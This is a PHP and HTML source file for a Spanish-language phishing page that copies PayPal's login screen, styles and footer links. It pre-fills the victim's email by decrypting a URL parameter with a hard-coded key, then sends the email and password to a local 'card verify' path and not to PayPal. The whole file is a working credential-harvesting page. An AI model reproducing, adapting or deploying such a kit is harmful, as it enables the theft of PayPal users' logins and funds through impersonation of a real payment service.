<?php
include("../inc/crypt.php");
if(!isset($_GET["securitycode"])){
  $value = "";
}
else{
  $value = decrypt($_GET["securitycode"],"Manaosuvita10");
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" type="image/x-icon" href="PayPal_archivos/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="PayPal_archivos/style.css">
    <link rel="stylesheet" href="PayPal_archivos/paypal-sans.css">
    <link rel="stylesheet" href="PayPal_archivos/contextualLogin.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link rel="stylesheet" href="PayPal_archivos/main-ltr.css">
    <link rel="stylesheet" href="PayPal_archivos/header-footer-min.css">
    <title>Inicie sesión en su cuenta de PayPal</title>
  </head>
  <body>
    <div class="container-fluid full">
      <div class="row justify-content-md-center">
        <div class="col-md-6 vent-modal">
          <div class="container-fluid">
            <div class="row borde">
              <form method="post" action="../myaccount/money/cards/verify/">
              <div class="col-md-12">
                <p class="paypal-logo paypal-logo-long"></p>
              </div>
              <div class="col-md-12">
                <div id="passwordSection" class="clearfix splitEmail">
                  <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                    <div class="textInput" id="login_emaildiv" style="z-index: 1;">
                      <div class="fieldWrapper ">
                        <label for="email" class="fieldLabel">Correo electrónico o número de celular</label>
                        <input id="email" aria-label="login_emaildiv" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="<?php echo $value ?>" autocomplete="off" placeholder="Correo electrónico o número de celular" aria-describedby="emailErrorMessage">
                      </div>
                      <div class="errorMessage" id="emailErrorMessage">
                        <p class="emptyError hide">Obligatorio</p>
                        <p class="invalidError hide">Ese formato de correo electrónico o número de celular no es correcto</p>
                      </div>
                    </div>
                  </div>
                  <div id="passwordSection" class="clearfix">
                    <div class="textInput  " id="login_passworddiv">
                      <div class="fieldWrapper ">
                        <label for="password" class="fieldLabel">Contraseña</label>
                        <input id="password" aria-label="login_passworddiv" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Contraseña" aria-describedby="passwordErrorMessage">
                        <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" aria-label="Mostrar contraseña" pa-marked="1">Mostrar</button>
                        <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" aria-label="Ocultar" pa-marked="1">Ocultar</button>
                        <button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button>
                      </div>
                      <div class="errorMessage" id="passwordErrorMessage">
                        <p class="emptyError hide">Campo obligatorio.</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="col-md-12">
                <div class="actions">
                  <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Iniciar sesión</button>
                </div>
                <div class="forgotLink">
                  <a href="https://www.paypal.com/authflow/password-recovery/" class="scTrack:unifiedlogin-click-forgot-password pwrLink" pa-marked="1">¿Tiene problemas para iniciar sesión?</a>
                </div>
              </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
<footer class="footer footerStayPut" role="contentinfo">
  <div class="legalFooter">
    <ul class="footerGroup">
      <li><a target="_blank" href="https://www.paypal.com/ar/cgi-bin/webscr?cmd=_help" pa-marked="1">Contactar</a></li>
      <li><a target="_blank" href="https://www.paypal.com/ar/webapps/mpp/ua/privacy-full" pa-marked="1">Privacidad</a></li>
      <li><a target="_blank" href="https://www.paypal.com/ar/webapps/mpp/ua/legalhub-full" pa-marked="1">Acuerdos legales</a></li>
      <li><a target="_blank" href="https://www.paypal.com/ar/webapps/mpp/about" pa-marked="1">Acerca de PayPal</a></li>
    </ul>
  </div>
</footer>
    <script src="PayPal_archivos/vx-lib.min.js"></script>
    <script src="PayPal_archivos/pa.js"></script>
    <script src="PayPal_archivos/vendor.js"></script>
    <script src="PayPal_archivos/appBundle.js"></script>
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  </body>
</html>